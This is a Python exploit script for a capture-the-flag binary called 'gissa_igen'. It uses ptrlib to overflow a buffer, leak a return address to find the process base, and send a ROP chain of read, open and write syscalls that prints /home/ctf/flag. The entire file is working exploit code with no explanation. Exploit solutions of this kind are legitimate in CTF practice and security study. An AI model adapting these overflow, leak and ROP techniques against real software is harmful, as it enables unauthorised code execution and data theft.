from ptrlib import *

sock = Process("./gissa_igen")

sock.recvuntil(": ")
sock.sendline("")

# prepare for overread
payload = b'A' * 0x8c
payload += p32(0xa8) # size
sock.recvuntil(": ")
sock.sendline(payload)

_ = input()
# leak proc base
payload = b'A' * 0x8c
payload += p16(0xbeef) # size
payload += p16(0x7fad) # miscnt
payload += b'A' * 8
payload += p64(0x893fffff01010101) # cnt
payload += b'A' * 8
sock.recvuntil(": ")
sock.sendline(payload)
result = sock.recvuntil(" is not right.")
addr_main_ret = u64(result.rstrip(b" is not right.")[-6:])
proc_base = addr_main_ret - 0xbc5
dump("proc base = " + hex(proc_base))

rop_pop_rax_rdi_rsi = proc_base + 0xc21
rop_pop_rdx_r9_r8_rdi_rsi = proc_base + 0xc1d
rop_syscall = proc_base + 0xbd9

# get the shell!
payload = b'A' * 0x8c
payload += p32(0xdeadbeef) # size
payload += b'A' * 0x18

payload += p64(rop_pop_rdx_r9_r8_rdi_rsi)
payload += p64(16)                   # count
payload += b'A' * (8 * 4)
payload += p64(rop_pop_rax_rdi_rsi)
payload += p64(0)                    # SYS_read
payload += p64(0)                    # stdin
payload += p64(proc_base + 0x202000) # buf
payload += p64(rop_syscall)          # syscall; ret;

payload += p64(rop_pop_rdx_r9_r8_rdi_rsi)
payload += p64(0)                    # mode
payload += b'A' * (8 * 4)
payload += p64(rop_pop_rax_rdi_rsi)
payload += p64(0x40000002)           # SYS_open
payload += p64(proc_base + 0x202000) # filename
payload += p64(0b1000)               # flags (O_RDONlY | O_TExT)
payload += p64(rop_syscall)          # syscall; ret;

payload += p64(rop_pop_rdx_r9_r8_rdi_rsi)
payload += p64(0x100)                # count
payload += b'A' * (8 * 4)
payload += p64(rop_pop_rax_rdi_rsi)
payload += p64(0)                    # SYS_read
payload += p64(3)                    # fd = 3 maybe?
payload += p64(proc_base + 0x202000) # buf
payload += p64(rop_syscall)          # syscall; ret;

payload += p64(rop_pop_rdx_r9_r8_rdi_rsi)
payload += p64(0x100)                # count
payload += b'A' * (8 * 4)
payload += p64(rop_pop_rax_rdi_rsi)
payload += p64(1)                    # SYS_write
payload += p64(1)                    # stdout
payload += p64(proc_base + 0x202000) # buf
payload += p64(rop_syscall)          # syscall; ret;

_ = input()
sock.recvuntil(": ")
sock.sendline(payload)

sock.send(b"/home/ctf/flag\x00")

sock.interactive()
